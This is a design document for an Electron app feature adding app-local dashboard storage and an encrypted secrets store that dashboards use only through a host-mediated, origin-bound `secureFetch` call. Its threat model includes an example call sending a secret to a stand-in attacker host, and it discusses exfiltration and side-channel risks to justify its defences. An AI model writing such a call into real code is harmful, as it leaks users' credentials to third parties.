## Context

Dashboards currently live only in `.data-vault/dashboards/` inside the vault repository (`DASHBOARD_NAMESPACE_DIRECTORY`, `src/dashboard-contracts.ts:2`), activated via a `dashboards` block in `vault.json` and resolved by `DashboardStorage` (`electron/dashboard-storage.ts`). They are therefore always synced with the vault. Trusted permission grants already live app-side in `DashboardPermissionStore` under `userData`, keyed by HMAC-derived `vaultKey` + dashboard ID + capability-request digest + bundle digest.

Dashboards execute as untrusted JavaScript in a sandboxed, network-denied web contents (`connect-src 'none'`), with a fixed 5-method `window.dashboardApi` validated at preload, IPC, and runtime layers. The security spec forbids dashboard APIs from accepting or returning credentials (`openspec/specs/security/spec.md:297`).

The only existing credential handling is the GitHub token store (`electron/github.ts`), which uses Electron `safeStorage` with a silent plaintext fallback when OS encryption is unavailable.

Two user decisions fix the shape of this change:

1. **Secret model — host-injected use.** Dashboards and agents see only secret names and set/unset status. To use a secret, a dashboard asks the host to perform an outbound HTTP request; the main process resolves the value and injects it. The raw value never enters dashboard JavaScript or agent context.
2. **Vault storage path — unchanged.** The shared location stays `.data-vault/dashboards/`; this change adds an **app-local** location, not a documents-dir move.

## Goals / Non-Goals

**Goals:**

- Let the user choose, per dashboard, between vault storage (shared via the vault repo) and app-local storage (private to this installation), at creation and via a later move.
- A global, per-installation secrets store: named values entered by the user in trusted UI, encrypted at rest, never written to any vault.
- Manifest-declared required secrets; a trusted secrets panel listing all required secrets with set/unset status and set/update/delete actions.
- `listSecrets` (metadata only) and `secureFetch` (host-mediated HTTP with secret injection) dashboard API operations behind a new privileged capability, origin-scoped by the manifest and user consent.

**Non-Goals:**

- Moving or duplicating the vault dashboard namespace under `<documents-dir>/dashboards`.
- Per-vault or synced secrets, secret sharing between installations, or secret export.
- General network access for dashboards; the CSP/session network denial is untouched — `secureFetch` is IPC, not browser networking.
- Any API that returns a secret value to dashboard or agent code, in any form.
- Secrets for non-dashboard features (e.g. replacing the GitHub token store).

## Decisions

### D1: App-local dashboards are per-vault, stored under `userData`

App-local bundles live in `<userData>/dashboards/<vaultKey>/`, mirroring the vault namespace layout (`registry.json`, one directory per dashboard ID, `.trash/`). They are keyed by the same HMAC `vaultKey` the permission store already uses, because dashboards read vault content and their grants are already vault-scoped.

- _Why not one global app-local set shown for every vault?_ A dashboard's index/document grants and its content are meaningful only against one vault; showing it against another vault would silently query different data under an old grant.
- _Why mirror the namespace layout?_ `DashboardStorage` already implements validation, atomic mutation, rollback, and trash semantics for exactly this layout; the class gains a root-resolution mode instead of a second implementation.

### D2: One `DashboardStorage` per location, merged at the service layer

`VaultService` composes two `DashboardStorage` instances (vault root, app-local root). Discovery merges the lists — vault dashboards first, then app-local, each in its own registry order. Dashboard IDs must be unique across both locations; a collision fails discovery of the colliding app-local entry closed (vault wins, as the shared/synced source).

**`location` is derived, never declared on disk.** It is not a field of `DashboardManifest`: the manifest is repository-controlled data parsed with strict `exactKeys`, and letting vault content assert its own storage location would be content granting authority over host placement, and would corrupt collision and digest handling. Instead the renderer-facing list type becomes `DashboardListEntry = DashboardManifest & { location: DashboardStorageLocation }`, populated by whichever `DashboardStorage` owns the bundle. `src/types.ts:244` changes from `Promise<DashboardManifest[]>` to `Promise<DashboardListEntry[]>`.

### D3: Move between locations is copy-register-then-remove with rollback

Moving a dashboard copies the bundle to the destination namespace, registers it there, then unregisters and deletes the source bundle. Any failure before the destination registration completes rolls back destination artifacts, per the existing atomicity requirement. The dashboard ID, bundle digest, and `vaultKey` are unchanged by a move, so existing permission grants remain valid — no re-approval is triggered by relocation alone.

### D4: Secrets are a global named store in `userData`, encrypted via `safeStorage`, with **no plaintext fallback**

A new `DashboardSecretStore` (`electron/dashboard-secrets.ts`) persists `dashboard-secrets.json` in `userData` using the existing atomic-private-file pattern (0600, temp+rename). Values are encrypted with `safeStorage.encryptString`. Unlike `github.ts`, when `safeStorage.isEncryptionAvailable()` is false the store **refuses to save** and the UI reports secrets as unavailable — a silent plaintext fallback contradicts the "never readable" posture.

Secrets are global to the installation (like environment variables): two dashboards declaring `NOTION_TOKEN` share one value. The panel shows the union of names declared by installed dashboards, plus any orphaned stored names, each with set/unset status. Values are write-only from the UI's perspective too: the panel shows status, never the stored value.

### D5: Manifest declares required secrets and allowed origins together

`dashboard.json` gains an optional `secrets` field:

```json
"secrets": [
  { "name": "NOTION_TOKEN", "origins": ["https://api.notion.com"] }
]
```

Names are bounded (count, length, `[A-Z0-9_]+` pattern); origins are exact HTTPS origins, no wildcards. The field participates in the canonical capability-request digest, so changing names or origins invalidates existing grants and forces re-approval, exactly like capability changes today.

`secrets` is added as an **optional field at the existing schema version — `DASHBOARD_SCHEMA_VERSION` is not bumped.** That constant is shared by `parseNamespaceConfig`, `parseRegistry`, and `parseManifest` (`electron/dashboard-storage.ts:79/88/110`), each of which rejects any value that is not exactly equal. Bumping it would make every existing vault's `vault.json` dashboards block, `registry.json`, and every installed manifest fail to parse simultaneously, with no migration path, contradicting the vault-format requirement that opening an existing vault requires no migration. Old application versions already reject a bundle declaring `secrets` through the strict `exactKeys` check, so a bump would only change the error message while breaking every existing dashboard.

- _Why origins in the manifest?_ Without origin binding, hostile dashboard JS could call `secureFetch("https://attacker.example", secret)` and the host would deliver the secret to the attacker. Binding each secret to user-approved origins makes the consent meaningful: "this dashboard may contact api.notion.com using NOTION_TOKEN".

### D6: One new privileged capability `secrets:use` gates both operations

`listSecrets` and `secureFetch` require `secrets:use`, which joins `DASHBOARD_PRIVILEGED_CAPABILITY_IDS` and flows through the existing request/grant/digest/consent machinery unchanged. The consent dialog renders the declared secret names and origins in plain language.

- _Why not a separate metadata capability?_ Set/unset status leaks a small fact about the user's environment; folding it into the single privileged grant keeps the model simple and the consent honest.

### D7: `secureFetch` is a fixed, bounded main-process HTTP call

Request schema: `{ url, method (GET/POST/PUT/PATCH/DELETE), headers (bounded, denylisted names), body (bounded), secret: { name, inject } }` where `inject` is a fixed enum (`authorization-bearer`, `header:<name>`, `query-param:<name>`). Header names are validated as RFC tokens and screened against a denylist (`host`, `cookie`, `authorization`, `origin`, `referer`, forwarding headers, …) rather than an allow-list, so ordinary content headers stay usable while routing, identity, and auth-overlapping headers are refused. Enforcement in `handleApiCall` / a new `services.secureFetch` callback wired in `main.ts`:

- capability `secrets:use` granted, name declared in the manifest, secret set, URL is HTTPS and its origin exactly matches a declared origin for that name;
- redirects are not followed (redirect responses are returned as status + headers only), so the secret cannot leak to an undeclared origin;
- response is bounded (size cap, timeout, content-type passthrough as bytes/text per fixed rules) and rate-limited per the existing limits pattern in `dashboard-contracts.ts`;
- caller-supplied headers can never overwrite the injected header, and error results and logs never contain the secret value.

The dashboard receives `{ status, headers (bounded subset), body }`, with **the secret redacted from every returned field, in every form the host's own injection can produce** — the raw value, its `encodeURIComponent` form, and its `application/x-www-form-urlencoded` form (where a space becomes `+`). Matching only the literal is not enough: query-param injection writes the value through `URLSearchParams`, so a redirect `Location` echo returns it percent-encoded, and any secret containing `+`, `/`, `=`, or a space — i.e. most real tokens — would survive a literal-only match. A remote that _deliberately_ transforms the value (HTML-entity or JSON escaping, base64) is out of scope for the same reason D7 accepts a remote choosing to echo a credential: it is indistinguishable from the remote simply publishing it.

Redaction runs **before** truncation on both headers and body. Headers arrive whole, so a slice after redaction is safe. The body is streamed, so it is read past the cap by the length of the **longest variant** — not the raw secret, since the encoded forms run up to three times longer — and when the stream was cut, that whole slack region is dropped from the end. Any residual partial variant is necessarily a suffix shorter than the slack, so dropping the slack removes it entirely. The drop and the overflow check are done in **string length, not bytes**: the read limit is a byte count, and a multi-byte body would otherwise never trip a byte-sized length comparison and would be returned unsliced, handing back the straddling prefix. Without this, a dashboard could pad a response and walk the secret out a few characters at a time across repeated calls.

Stored secrets have a minimum length. A one- or two-character value would make redaction shred every response it appeared in, and would turn response echoes into a cheap guess-confirmation oracle. Redaction by value rather than by a header blocklist is deliberate: with query-param injection the host itself writes the secret into the request line, and any redirect that preserves the query string echoes it back through `Location` (and `content-location`, `refresh`, …). Redacting the body on the same pass also closes the case where a remote echoes the credential, which an earlier draft of this design accepted as unavoidable — it is not, and the guarantee is easier to state as absolute: no returned field ever contains the secret value.

Reading the response body happens inside the same `catch` that sanitizes transport errors, because a mid-body reset, decode failure, or timeout rejects with an error whose `cause` can embed the outgoing request.

Secure fetches share the runtime's existing expensive-read budget (30/minute) with vault index and document reads rather than getting a dedicated one, so they cannot be used to widen that limit.

### D8: Agent surface is metadata-only

The agent-handoff contract documents the `secrets` manifest field and the metadata semantics. Agents interact with secrets only by declaring names/origins in the manifest and (via a running dashboard) `listSecrets`. There is no IPC channel, CLI, or file that exposes a decrypted value; the decrypted value exists only transiently in the main process inside `secureFetch`.

### D9: Renderer UI

- **Create flow** gains a storage-location choice (vault = shared with the vault repository; local = only this computer), defaulting to vault.
- **Dashboard context/manage UI** gains "Move to vault / Move to this computer".
- **Secrets panel** is trusted host chrome (like the permission dialog, modeled on `src/components/dashboard-permission-dialog.tsx`): lists every required secret (name, requiring dashboards, set/unset), with set/update/delete via a value input that is never pre-filled. When a dashboard's runtime reports a missing required secret, the host surfaces a prompt that opens this panel; the dashboard itself cannot open or overlay it.

## Risks / Trade-offs

- [Hostile dashboard exfiltrates a secret via `secureFetch`] → origins are manifest-declared, digest-bound, user-approved, HTTPS-only, exact-match; redirects not followed; injected header not caller-controllable.
- [Secret readable if it ever crosses IPC] → value never appears in any IPC payload, API result, error message, or log; only ciphertext at rest, plaintext only transiently in main during `secureFetch`.
- [OS keychain unavailable (e.g. some Linux setups)] → secrets feature reports unavailable and refuses plaintext storage; dashboards see `set: false`. Trade-off: feature is unusable there, accepted over silent plaintext.
- [App-local/vault ID collision after a vault sync] → vault entry wins deterministically; app-local duplicate is reported, not adopted or deleted.
- [Move operation interrupted] → copy-register-remove ordering with rollback of destination artifacts; source remains valid until destination registration completes. If removing the source fails _after_ a successful adopt, the destination copy is rolled back too — leaving it registered in both namespaces would strand it permanently, because the vault-first owner rule hides the new copy and every later move is refused for an existing destination.
- [Damaged app-local namespace hides the vault's dashboards] → app-local discovery failures are caught and reported per-vault rather than propagating. The app-local store is opaque to the user, whereas vault dashboards are visible and fixable in the repository, so one must not take the other down.
- [Two dashboards share one global secret name unintentionally] → panel lists which dashboards require each name; accepted for simplicity (env-var semantics). Because the namespace is global, a hostile dashboard can declare a name the user already filled in for a legitimate one, so the consent dialog warns explicitly when the declared name already has a stored value.
- [Corrupt secret store silently discarded on the next write] → reads fail safe as empty, but `set`/`delete` refuse to mutate an unreadable store rather than rebuilding it from an empty baseline and destroying the user's other secrets.
- [Secret length inferred through a third-party side channel] → with query-param injection a dashboard can pad the path and watch for the declared origin's 414/400 threshold to derive the value's length. Not closable while query-param injection exists; accepted, since it is a property of the remote service rather than an API return, and no value is disclosed.
- [Grant/consent complexity grows] → reuse of the existing digest-bound privileged-capability machinery, no parallel consent path.

## Migration Plan

- Existing vaults: no migration. Absent `secrets` manifest fields and absent app-local namespaces mean unchanged behavior; `vault.json` schema is extended only by the new manifest field validation, not restructured.
- Older app versions opening a vault whose dashboards declare `secrets`: manifest key validation is strict (`exactKeys`), so such bundles are rejected by old versions as invalid rather than silently losing the declaration. This is acceptable and is why no schema-version bump is needed (see D5); the rest of the vault and other dashboards continue to open normally.
- Rollback: removing the feature leaves `dashboard-secrets.json` (ciphertext) and app-local namespaces inert on disk.

## Known limitations

- App-local bundles are addressed by an HMAC of the vault's real repository path. Moving or re-cloning the vault directory changes that key, so app-local dashboards — which by definition have no second copy — stop being discovered, and the old `<userData>/dashboards/<oldKey>` namespace is never garbage-collected. Recovering means restoring the original path. Worth a follow-up change if app-local storage sees real use.

## Open Questions

- None blocking. Response-size cap, rate limits, and the allow-listed header set are fixed during implementation following the existing limits table in `src/dashboard-contracts.ts`.
